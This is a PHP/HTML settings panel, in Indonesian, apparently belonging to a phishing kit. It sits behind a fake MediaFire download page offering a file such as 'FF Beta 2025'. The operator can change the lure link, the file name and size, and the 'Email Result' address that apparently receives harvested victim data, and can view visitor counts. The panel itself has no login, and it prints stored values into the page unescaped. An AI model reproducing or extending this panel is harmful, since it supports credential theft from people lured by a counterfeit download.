<?php
// DATA.JSON
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);

// VISITOR.JSON
$ngVis = file_get_contents("system/visitor.json");
$vis = json_decode($ngVis,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('system/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
?>
<html>
 <head>
  <style type="text/css">.swal-icon--error{border-color:#f27474;-webkit-animation:animateErrorIcon .5s;animation:animateErrorIcon .5s}.swal-icon--error__x-mark{position:relative;display:block;-webkit-animation:animateXMark .5s;animation:animateXMark .5s}.swal-icon--error__line{position:absolute;height:5px;width:47px;background-color:#f27474;display:block;top:37px;border-radius:2px}.swal-icon--error__line--left{-webkit-transform:rotate(45deg);transform:rotate(45deg);left:17px}.swal-icon--error__line--right{-webkit-transform:rotate(-45deg);transform:rotate(-45deg);right:16px}@-webkit-keyframes animateErrorIcon{0%{-webkit-transform:rotateX(100deg);transform:rotateX(100deg);opacity:0}to{-webkit-transform:rotateX(0deg);transform:rotateX(0deg);opacity:1}}@keyframes animateErrorIcon{0%{-webkit-transform:rotateX(100deg);transform:rotateX(100deg);opacity:0}to{-webkit-transform:rotateX(0deg);transform:rotateX(0deg);opacity:1}}@-webkit-keyframes animateXMark{0%{-webkit-transform:scale(.4);transform:scale(.4);margin-top:26px;opacity:0}50%{-webkit-transform:scale(.4);transform:scale(.4);margin-top:26px;opacity:0}80%{-webkit-transform:scale(1.15);transform:scale(1.15);margin-top:-6px}to{-webkit-transform:scale(1);transform:scale(1);margin-top:0;opacity:1}}@keyframes animateXMark{0%{-webkit-transform:scale(.4);transform:scale(.4);margin-top:26px;opacity:0}50%{-webkit-transform:scale(.4);transform:scale(.4);margin-top:26px;opacity:0}80%{-webkit-transform:scale(1.15);transform:scale(1.15);margin-top:-6px}to{-webkit-transform:scale(1);transform:scale(1);margin-top:0;opacity:1}}.swal-icon--warning{border-color:#f8bb86;-webkit-animation:pulseWarning .75s infinite alternate;animation:pulseWarning .75s infinite alternate}.swal-icon--warning__body{width:5px;height:47px;top:10px;border-radius:2px;margin-left:-2px}.swal-icon--warning__body,.swal-icon--warning__dot{position:absolute;left:50%;background-color:#f8bb86}.swal-icon--warning__dot{width:7px;height:7px;border-radius:50%;margin-left:-4px;bottom:-11px}@-webkit-keyframes pulseWarning{0%{border-color:#f8d486}to{border-color:#f8bb86}}@keyframes pulseWarning{0%{border-color:#f8d486}to{border-color:#f8bb86}}.swal-icon--success{border-color:#a5dc86}.swal-icon--success:after,.swal-icon--success:before{content:"";border-radius:50%;position:absolute;width:60px;height:120px;background:#fff;-webkit-transform:rotate(45deg);transform:rotate(45deg)}.swal-icon--success:before{border-radius:120px 0 0 120px;top:-7px;left:-33px;-webkit-transform:rotate(-45deg);transform:rotate(-45deg);-webkit-transform-origin:60px 60px;transform-origin:60px 60px}.swal-icon--success:after{border-radius:0 120px 120px 0;top:-11px;left:30px;-webkit-transform:rotate(-45deg);transform:rotate(-45deg);-webkit-transform-origin:0 60px;transform-origin:0 60px;-webkit-animation:rotatePlaceholder 4.25s ease-in;animation:rotatePlaceholder 4.25s ease-in}.swal-icon--success__ring{width:80px;height:80px;border:4px solid hsla(98,55%,69%,.2);border-radius:50%;box-sizing:content-box;position:absolute;left:-4px;top:-4px;z-index:2}.swal-icon--success__hide-corners{width:5px;height:90px;background-color:#fff;padding:1px;position:absolute;left:28px;top:8px;z-index:1;-webkit-transform:rotate(-45deg);transform:rotate(-45deg)}.swal-icon--success__line{height:5px;background-color:#a5dc86;display:block;border-radius:2px;position:absolute;z-index:2}.swal-icon--success__line--tip{width:25px;left:14px;top:46px;-webkit-transform:rotate(45deg);transform:rotate(45deg);-webkit-animation:animateSuccessTip .75s;animation:animateSuccessTip .75s}.swal-icon--success__line--long{width:47px;right:8px;top:38px;-webkit-transform:rotate(-45deg);transform:rotate(-45deg);-webkit-animation:animateSuccessLong .75s;animation:animateSuccessLong .75s}@-webkit-keyframes rotatePlaceholder{0%{-webkit-transform:rotate(-45deg);transform:rotate(-45deg)}5%{-webkit-transform:rotate(-45deg);transform:rotate(-45deg)}12%{-webkit-transform:rotate(-405deg);transform:rotate(-405deg)}to{-webkit-transform:rotate(-405deg);transform:rotate(-405deg)}}@keyframes rotatePlaceholder{0%{-webkit-transform:rotate(-45deg);transform:rotate(-45deg)}5%{-webkit-transform:rotate(-45deg);transform:rotate(-45deg)}12%{-webkit-transform:rotate(-405deg);transform:rotate(-405deg)}to{-webkit-transform:rotate(-405deg);transform:rotate(-405deg)}}@-webkit-keyframes animateSuccessTip{0%{width:0;left:1px;top:19px}54%{width:0;left:1px;top:19px}70%{width:50px;left:-8px;top:37px}84%{width:17px;left:21px;top:48px}to{width:25px;left:14px;top:45px}}@keyframes animateSuccessTip{0%{width:0;left:1px;top:19px}54%{width:0;left:1px;top:19px}70%{width:50px;left:-8px;top:37px}84%{width:17px;left:21px;top:48px}to{width:25px;left:14px;top:45px}}@-webkit-keyframes animateSuccessLong{0%{width:0;right:46px;top:54px}65%{width:0;right:46px;top:54px}84%{width:55px;right:0;top:35px}to{width:47px;right:8px;top:38px}}@keyframes animateSuccessLong{0%{width:0;right:46px;top:54px}65%{width:0;right:46px;top:54px}84%{width:55px;right:0;top:35px}to{width:47px;right:8px;top:38px}}.swal-icon--info{border-color:#c9dae1}.swal-icon--info:before{width:5px;height:29px;bottom:17px;border-radius:2px;margin-left:-2px}.swal-icon--info:after,.swal-icon--info:before{content:"";position:absolute;left:50%;background-color:#c9dae1}.swal-icon--info:after{width:7px;height:7px;border-radius:50%;margin-left:-3px;top:19px}.swal-icon{width:80px;height:80px;border-width:4px;border-style:solid;border-radius:50%;padding:0;position:relative;box-sizing:content-box;margin:20px auto}.swal-icon:first-child{margin-top:32px}.swal-icon--custom{width:auto;height:auto;max-width:100%;border:none;border-radius:0}.swal-icon img{max-width:100%;max-height:100%}.swal-title{color:rgba(0,0,0,.65);font-weight:600;text-transform:none;position:relative;display:block;padding:13px 16px;font-size:27px;line-height:normal;text-align:center;margin-bottom:0}.swal-title:first-child{margin-top:26px}.swal-title:not(:first-child){padding-bottom:0}.swal-title:not(:last-child){margin-bottom:13px}.swal-text{font-size:16px;position:relative;float:none;line-height:normal;vertical-align:top;text-align:left;display:inline-block;margin:0;padding:0 10px;font-weight:400;color:rgba(0,0,0,.64);max-width:calc(100% - 20px);overflow-wrap:break-word;box-sizing:border-box}.swal-text:first-child{margin-top:45px}.swal-text:last-child{margin-bottom:45px}.swal-footer{text-align:right;padding-top:13px;margin-top:13px;padding:13px 16px;border-radius:inherit;border-top-left-radius:0;border-top-right-radius:0}.swal-button-container{margin:5px;display:inline-block;position:relative}.swal-button{background-color:#7cd1f9;color:#fff;border:none;box-shadow:none;border-radius:5px;font-weight:600;font-size:14px;padding:10px 24px;margin:0;cursor:pointer}.swal-button:not([disabled]):hover{background-color:#78cbf2}.swal-button:active{background-color:#70bce0}.swal-button:focus{outline:none;box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(43,114,165,.29)}.swal-button[disabled]{opacity:.5;cursor:default}.swal-button::-moz-focus-inner{border:0}.swal-button--cancel{color:#555;background-color:#efefef}.swal-button--cancel:not([disabled]):hover{background-color:#e8e8e8}.swal-button--cancel:active{background-color:#d7d7d7}.swal-button--cancel:focus{box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(116,136,150,.29)}.swal-button--danger{background-color:#e64942}.swal-button--danger:not([disabled]):hover{background-color:#df4740}.swal-button--danger:active{background-color:#cf423b}.swal-button--danger:focus{box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(165,43,43,.29)}.swal-content{padding:0 20px;margin-top:20px;font-size:medium}.swal-content:last-child{margin-bottom:20px}.swal-content__input,.swal-content__textarea{-webkit-appearance:none;background-color:#fff;border:none;font-size:14px;display:block;box-sizing:border-box;width:100%;border:1px solid rgba(0,0,0,.14);padding:10px 13px;border-radius:2px;transition:border-color .2s}.swal-content__input:focus,.swal-content__textarea:focus{outline:none;border-color:#6db8ff}.swal-content__textarea{resize:vertical}.swal-button--loading{color:transparent}.swal-button--loading~.swal-button__loader{opacity:1}.swal-button__loader{position:absolute;height:auto;width:43px;z-index:2;left:50%;top:50%;-webkit-transform:translateX(-50%) translateY(-50%);transform:translateX(-50%) translateY(-50%);text-align:center;pointer-events:none;opacity:0}.swal-button__loader div{display:inline-block;float:none;vertical-align:baseline;width:9px;height:9px;padding:0;border:none;margin:2px;opacity:.4;border-radius:7px;background-color:hsla(0,0%,100%,.9);transition:background .2s;-webkit-animation:swal-loading-anim 1s infinite;animation:swal-loading-anim 1s infinite}.swal-button__loader div:nth-child(3n+2){-webkit-animation-delay:.15s;animation-delay:.15s}.swal-button__loader div:nth-child(3n+3){-webkit-animation-delay:.3s;animation-delay:.3s}@-webkit-keyframes swal-loading-anim{0%{opacity:.4}20%{opacity:.4}50%{opacity:1}to{opacity:.4}}@keyframes swal-loading-anim{0%{opacity:.4}20%{opacity:.4}50%{opacity:1}to{opacity:.4}}.swal-overlay{position:fixed;top:0;bottom:0;left:0;right:0;text-align:center;font-size:0;overflow-y:auto;background-color:rgba(0,0,0,.4);z-index:10000;pointer-events:none;opacity:0;transition:opacity .3s}.swal-overlay:before{content:" ";display:inline-block;vertical-align:middle;height:100%}.swal-overlay--show-modal{opacity:1;pointer-events:auto}.swal-overlay--show-modal .swal-modal{opacity:1;pointer-events:auto;box-sizing:border-box;-webkit-animation:showSweetAlert .3s;animation:showSweetAlert .3s;will-change:transform}.swal-modal{width:478px;opacity:0;pointer-events:none;background-color:#fff;text-align:center;border-radius:5px;position:static;margin:20px auto;display:inline-block;vertical-align:middle;-webkit-transform:scale(1);transform:scale(1);-webkit-transform-origin:50% 50%;transform-origin:50% 50%;z-index:10001;transition:opacity .2s,-webkit-transform .3s;transition:transform .3s,opacity .2s;transition:transform .3s,opacity .2s,-webkit-transform .3s}@media (max-width:500px){.swal-modal{width:calc(100% - 20px)}}@-webkit-keyframes showSweetAlert{0%{-webkit-transform:scale(1);transform:scale(1)}1%{-webkit-transform:scale(.5);transform:scale(.5)}45%{-webkit-transform:scale(1.05);transform:scale(1.05)}80%{-webkit-transform:scale(.95);transform:scale(.95)}to{-webkit-transform:scale(1);transform:scale(1)}}@keyframes showSweetAlert{0%{-webkit-transform:scale(1);transform:scale(1)}1%{-webkit-transform:scale(.5);transform:scale(.5)}45%{-webkit-transform:scale(1.05);transform:scale(1.05)}80%{-webkit-transform:scale(.95);transform:scale(.95)}to{-webkit-transform:scale(1);transform:scale(1)}}</style> 
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"> 
  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
  <title>SETTING</title> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> 
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/style.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
  </head>
<body>

<!-- MAS ABU -->

<body>
    <section>
        <header>
            <div class="l-icon">
                <i class="fa fa-sun-o" aria-hidden="true"></i>
            </div>
            <h1>SETTING</h1>
            <div class="r-icon">
                <i class="fa fa-sun-o" aria-hidden="true"></i>
            </div>
        </header>
        <div class="wrap">
            <div class="pemberitahuan" style="overflow:hidden;margin-top:10px;padding:2px;">
                <img style="border-radius:3px;max-width:50%;" src="https://cdn.worldvectorlogo.com/logos/mediafire-1.svg">
            </div>

            <!-- Formulir untuk Ganti Link -->
            <div class="formulir" id="change1" style="display:none;">
                <div class="form-group">
                    <span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
                    <input type="email" id="ngLink" class="form-input" placeholder="https://cahyosr.my.id/done.webp" autocomplete="off">
                </div>
                <div style="margin-top:10px;" class="form-group otp-btn">
                    <button id="btnLink" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Link</button>
                </div>
            </div>

            <!-- Formulir untuk Ganti Nama File -->
            <div class="formulir" id="change2" style="display:none;">
                <div class="form-group">
                    <span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
                    <input type="email" id="ngVideo" class="form-input" placeholder="Contoh : FF Beta 2025" autocomplete="off">
                </div>
                <div style="margin-top:10px;" class="form-group" id="otp-btn">
                    <button id="btnVideo" type="submit" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti nama file</button>
                </div>
            </div>

            <!-- Formulir untuk Ganti Ukuran File -->
            <div class="formulir" id="change3" style="display:none;">
                <div class="form-group">
                    <span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
                    <input type="email" id="ngUkuran" class="form-input" placeholder="Contoh : 12.2" autocomplete="off">
                </div>
                <div style="margin-top:10px;" class="form-group" id="otp-btn">
                    <button id="btnUkuran" type="submit" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti ukuran file</button>
                </div>
            </div>

            <!-- Formulir untuk Ganti Email Result -->
            <div class="formulir" id="change4" style="display:none;">
                <div class="form-group">
                    <span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
                    <input type="email" id="ngEmail" class="form-input" placeholder="Contoh : emailmu@gmail.com" autocomplete="off">
                </div>
                <div style="margin-top:10px;" class="form-group" id="otp-btn">
                    <button id="btnEmail" type="submit" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Email Result</button>
                </div>
            </div>

            <!-- Formulir untuk Ganti Nama Result -->
            <div class="formulir" id="change5" style="display:none;">
                <div class="form-group">
                    <span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
                    <input type="email" id="ngNama" class="form-input" placeholder="Contoh : WEB CAHYO SR II" autocomplete="off">
                </div>
                <div style="margin-top:10px;" class="form-group" id="otp-btn">
                    <button id="btnNama" type="submit" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Nama Result</button> 
              </div> 
              </div> 
              <div class="pemberitahuan"> 
              <div class="visitor"> 
              <span class="atas">Hari Ini</span> 
              <span class="bawah"><?php echo $vis['today'];?></span> 
              </div> 
              <div class="visitor"> 
              <span class="atas">Kemarin</span> 
              <span class="bawah"><?php echo $vis['yesterday'];?></span> 
              </div> 
              <div class="visitor"> 
              <span class="atas">Total</span> 
              <span class="bawah"><?php echo $vis['total'];?></span> 
              </div> 
              </div> 
               <div class="pemberitahuan"> 
                <span id="ubahLink" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Link file</span>
                <span id="ubahVideo" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti nama file</span>
                <span id="ubahUkuran" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti ukuran file</span>
            </div>

            <!-- Pemberitahuan tambahan untuk Email Result dan Nama Result -->
            <div class="pemberitahuan">
                <span id="ubahEmail" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Email Result</span>
                <span id="ubahNama" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Nama Result</span>
            </div>

            <!-- Formulir untuk Data yang tidak bisa diubah -->
            <div class="formulir">
                <div class="form-group">
                    <span style="background:#91acda;" class="icon">Link Tujuan</span>
                    <input style="background:#8c96d7;" type="text" class="form-input" id="valLink" value="<?php echo $data['linkweb']; ?>" readonly>
                </div>
                <div class="form-group">
                    <span style="background:#91acda;" class="icon">Nama Video</span>
                    <input style="background:#8c96d7;" type="email" id="valVideo" class="form-input" value="<?php echo $data['nama']; ?>" readonly>
                </div>
                <div class="form-group" style="margin-top:10px;">
                    <span style="background:#91acda;" class="icon">Ukuran Video</span>
                    <input style="background:#8c96d7;" type="email" id="valUkuran" class="form-input" value="<?php echo $data['ukuran']; ?>" readonly>
                </div>
                <div class="form-group" style="margin-top:10px;">
                    <span style="background:#91acda;" class="icon">Email Result</span>
                    <input style="background:#8c96d7;" type="email" id="valEmail" class="form-input" value="<?php echo $data['email_result']; ?>" readonly>
                </div>
                <div class="form-group" style="margin-top:10px;">
                    <span style="background:#91acda;" class="icon">Nama Result</span>
                    <input style="background:#8c96d7;" type="email" id="valNama" class="form-input" value="<?php echo $data['nama_result']; ?>" readonly>
                </div>
            </div>
        </div>
    </section>
    
    <script type="text/javascript">
        // Tampilkan formulir sesuai tombol
        $("#ubahLink").click(function() {
            $("#change2, #change3, #change4, #change5").hide();
            $("#change1").fadeIn();
        });

        $("#ubahVideo").click(function() {
            $("#change1, #change3, #change4, #change5").hide();
            $("#change2").fadeIn();
        });

        $("#ubahUkuran").click(function() {
            $("#change1, #change2, #change4, #change5").hide();
            $("#change3").fadeIn();
        });

        $("#ubahEmail").click(function() {
            $("#change1, #change2, #change3, #change5").hide();
            $("#change4").fadeIn();
        });

        $("#ubahNama").click(function() {
            $("#change1, #change2, #change3, #change4").hide();
            $("#change5").fadeIn();
        });

        // Update Link (Email di change1)
        $("#btnLink").click(function() {
            var ngLink = $("#ngLink").val();
            $.post("system/UpdateData.php", { linkweb: ngLink }, function(ngE) {
                if (ngE === "Sukses") {
                    $("#valLink").val(ngLink);
                    swal("Berhasil!", "Link berhasil diperbarui!", "success");
                } else {
                    swal("Gagal!", "Terjadi kesalahan, silakan coba lagi.", "error");
                }
            });
        });

        // Update Nama File
        $("#btnVideo").click(function() {
            var ngVideo = $("#ngVideo").val();
            $.post("system/UpdateData.php", { nama: ngVideo }, function(ngE) {
                if (ngE === "Sukses") {
                    $("#valVideo").val(ngVideo);
                    swal("Berhasil!", "Nama file berhasil diperbarui!", "success");
                } else {
                    swal("Gagal!", "Terjadi kesalahan, silakan coba lagi.", "error");
                }
            });
        });

        // Update Ukuran File
        $("#btnUkuran").click(function() {
            var ngUkuran = $("#ngUkuran").val();
            $.post("system/UpdateData.php", { ukuran: ngUkuran }, function(ngE) {
                if (ngE === "Sukses") {
                    $("#valUkuran").val(ngUkuran);
                    swal("Berhasil!", "Ukuran file berhasil diperbarui!", "success");
                } else {
                    swal("Gagal!", "Terjadi kesalahan, silakan coba lagi.", "error");
                }
            });
        });

        // Update Email (change4)
        $("#btnEmail").click(function() {
            var ngEmail = $("#ngEmail").val();
            $.post("system/UpdateData.php", { email_result: ngEmail }, function(ngE) {
                if (ngE === "Sukses") {
                    $("#valEmail").val(ngEmail);
                    swal("Berhasil!", "Email Result berhasil diperbarui!", "success");
                } else {
                    swal("Gagal!", "Terjadi kesalahan, silakan coba lagi.", "error");
                }
            });
        });

        // Update Nama Result (change5)
        $("#btnNama").click(function() {
            var ngNama = $("#ngNama").val();
            $.post("system/UpdateData.php", { nama_result: ngNama }, function(ngE) {
                if (ngE === "Sukses") {
                    $("#valNama").val(ngNama);
                    swal("Berhasil!", "Nama result berhasil diperbarui!", "success");
                } else {
                    swal("Gagal!", "Terjadi kesalahan, silakan coba lagi.", "error");
                }
            });
        });
    </script>
</body>
</html>